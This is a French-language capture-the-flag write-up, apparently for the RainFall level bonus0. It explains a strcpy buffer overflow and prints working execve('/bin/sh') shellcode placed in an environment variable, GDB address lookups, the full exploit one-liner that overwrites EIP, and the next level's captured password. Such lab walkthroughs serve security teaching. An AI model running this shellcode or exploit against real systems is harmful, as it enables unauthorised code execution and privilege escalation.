@@ -1,0 +1,92 @@
+Je trouve un programme bonus0 qui contient deux fonction, une fonction pp et une fonction p.
+
+La fonction p prend une chaine de caractère dans l'entrer standard et la copy dans la variable dest avec la fonction strncpy qui prend les 20 premier caractère.
+
+la fonction pp appel la fonction p deux fois puis elle effectue une copie avec strcpy du resultat du premier appel de la fonction p
+
+La fonction strcpy est vulnerable au injection de type buffer overflow.
+
+La taille du buffer étant limiter a 20 nous allons devoir utiliser une autre technique et envoyez notre shellcode directement dans une variable d'environnement puis récrire la variable EIP avec l'addresse de notre variable environnement.
+
+
+	export exploit=$(python -c 'print "\x90" * 1024 + "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"')
+
+je vérifie que mon export c'est bien passé
+
+
+		bonus0@RainFall:~$ env
+		TERM=xterm-256color
+		SHELL=/bin/bash
+		SSH_CLIENT=10.19.1.31 51046 4242
+		OLDPWD=/home/user/bonus0
+		SSH_TTY=/dev/pts/0
+		USER=bonus0
+		LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:
+		MAIL=/var/mail/bonus0
+		PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+		PWD=/home/user/bonus0
+		LANG=en_US.UTF-8
+		exploit=����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1��F1�1�̀�[1��C��C
+															�
+															��S
+																̀�����/bin/sh
+		SHLVL=1
+		HOME=/home/user/bonus0
+		LC_TERMINAL_VERSION=3.4.11
+		LOGNAME=bonus0
+		SSH_CONNECTION=10.19.1.31 51046 10.19.1.159 4242
+		LESSOPEN=| /usr/bin/lesspipe %s
+		LC_TERMINAL=iTerm2
+		LESSCLOSE=/usr/bin/lesspipe %s %s
+		_=/usr/bin/env
+
+Ma variable c'est bien crée il ne me reste qu'a récuperer l'addresse de ma variable environnement a travers GDB pour cela je lance GDB et je place un breakpoint sur la fonction main.
+
+	bonus0@RainFall:~$ gdb -q bonus0
+	Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
+	(gdb) b main
+	Breakpoint 1 at 0x80485a7
+	(gdb) r
+	Starting program: /home/user/bonus0/bonus0
+
+	Breakpoint 1, 0x080485a7 in main ()
+	(gdb)
+
+Puis j'affiche les varaible environnement
+
+		x/20s *((char **)environ)
+
+		0xbffff4aa:	 "SHELL=/bin/bash"
+		0xbffff4ba:	 "TERM=xterm-256color"
+		0xbffff4ce:	 "SSH_CLIENT=10.19.1.31 51046 4242"
+		0xbffff4ef:	 "SSH_TTY=/dev/pts/0"
+		0xbffff502:	 "USER=bonus0"
+		0xbffff50e:	 "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31"...
+		0xbffff5d6:	 ":*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.d"...
+		0xbffff69e:	 "eb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35"...
+		0xbffff766:	 ":*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mk"...
+		0xbffff82e:	 "v=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35"...
+		0xbffff8f6:	 ":*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00"...
+		0xbffff9be:	 ";36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:"
+		0xbffffa2f:	 "COLUMNS=249"
+		0xbffffa3b:	 "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
+		0xbffffa88:	 "MAIL=/var/mail/bonus0"
+		0xbffffa9e:	 "_=/usr/bin/gdb"
+		0xbffffaad:	 "PWD=/home/user/bonus0"
+		0xbffffac3:	 "LANG=en_US.UTF-8"
+		0xbffffad4:	 "exploit=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
+		0xbffffb9c:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
+
+L'addresse de ma ma varaible env est 0xbffffad4 il ne me reste plus qu'a construire mon exploit et l'injecter dans le programme. Je prévoie juste une décallage de l'addresse de ma varaible env
+
+	(python -c 'print "A"*4095 + "\n" + "\x90"*9 + "\x9c\xfb\xff\xbf" + "B"*10'; cat -) | ./bonus0
+
+Me voila sur l'utilisateur bonus1
+
+	whoami
+	bonus1
+	pwd
+	/home/user/bonus0
+	cd /home/user/bonus1
+	cat .pass
+	cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
